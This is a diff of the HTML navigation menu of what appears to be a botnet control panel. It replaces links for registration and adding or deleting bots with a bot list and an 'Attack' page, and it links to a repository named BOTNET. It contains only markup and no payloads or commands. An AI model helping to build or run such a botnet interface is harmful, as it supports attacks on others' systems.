@@ -40,23 +40,20 @@
 				<img width="20%" src="/images/bitskull.jpg">
 			</header>
 			<nav class="mdl-navigation">
-				<a class="mdl-navigation__link" href="index"> <i
-					class="material-icons" role="presentation">dashboard</i> Dashboard
-				</a>
-				 <a class="mdl-navigation__link" href="newuser"> <i
-					class="material-icons" role="presentation"><i
-						class="fa fa-address-book-o" aria-hidden="true"></i></i> Registration
-				</a> 
-				<a class="mdl-navigation__link mdl -navigation__link--current" href="addbot">
-					<i class="material-icons" role="presentation"><i
-						class="fa fa-plus-square-o" aria-hidden="true"></i></i> <i>Add Bot</i>
-				</a>
-				<a class="mdl-navigation__link mdl -navigation__link--current" href="removeallbot">
-					<i class="material-icons" role="presentation"><i
-						class="fa fa-trash-o" aria-hidden="true"></i></i> <i>Delete Bot</i>
-				</a>
-
-
+		  <a class="mdl-navigation__link mdl -navigation__link--current" href="index">
+                <i class="material-icons" role="presentation">dashboard</i>
+                Dashboard
+            </a>
+            <a class="mdl-navigation__link" href="showbot">
+                <i class="material-icons" role="presentation">person</i>
+                Bot List
+            </a>
+            
+                      
+        <a class="mdl-navigation__link" href="attack">
+                <i class="material-icons" role="presentation">&#9760;</i>
+                Attack
+            </a>
 
             <div class="mdl-layout-spacer"></div>
             <a class="mdl-navigation__link" href="https://github.com/xXCiccioXx/BOTNET">
